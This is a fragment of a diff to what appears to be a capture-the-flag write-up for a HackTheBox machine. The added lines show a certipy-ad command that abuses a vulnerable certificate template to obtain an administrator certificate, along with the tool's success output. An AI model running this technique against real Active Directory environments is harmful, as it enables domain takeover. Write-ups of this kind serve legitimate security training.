@@ -534,5 +534,19 @@ Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 Now i have a machine account i can request a certificate
 
 ```python
+certipy-ad req -u 'EVIL$' -p 'Password123!' -dc-ip '10.129.229.56' -target 'authority.authority.htb' -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500' -key-size 4096 
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 7
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@authority.htb'
+[*] Certificate object SID is 'S-1-5-21-622327497-3269355298-2248959698-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+Now i have the certificate i can authenticate 
+
+```python
 
 ```
